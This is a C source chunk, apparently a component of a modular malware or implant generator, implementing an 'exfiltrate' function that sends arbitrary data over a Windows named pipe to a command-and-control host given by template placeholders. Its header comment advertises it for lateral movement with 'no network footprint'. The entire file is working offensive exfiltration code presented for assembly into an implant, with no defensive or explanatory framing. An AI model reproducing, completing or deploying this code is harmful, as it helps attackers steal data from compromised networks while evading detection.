// chunk: exfil/named_pipe
// depends: core/emit_buffer
// provides: exfiltrate
// headers: windows.h
// libs: (none)
// note: Write data to named pipe — good for lateral movement, no network footprint

#ifndef CHUNK_NAMED_PIPE
#define CHUNK_NAMED_PIPE

#include <windows.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    (void)port;
    char pipe_path[256];
    snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\exfil", ip);

    if (!WaitNamedPipeA(pipe_path, 5000))
        return FALSE;

    HANDLE hPipe = CreateFileA(pipe_path, GENERIC_WRITE, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    DWORD mode = PIPE_READMODE_BYTE;
    SetNamedPipeHandleState(hPipe, &mode, NULL, NULL);

    DWORD written = 0;
    DWORD offset = 0;
    BOOL ok = TRUE;
    while (offset < len && ok) {
        ok = WriteFile(hPipe, data + offset, len - offset, &written, NULL);
        offset += written;
    }

    CloseHandle(hPipe);
    return ok;
}

#endif
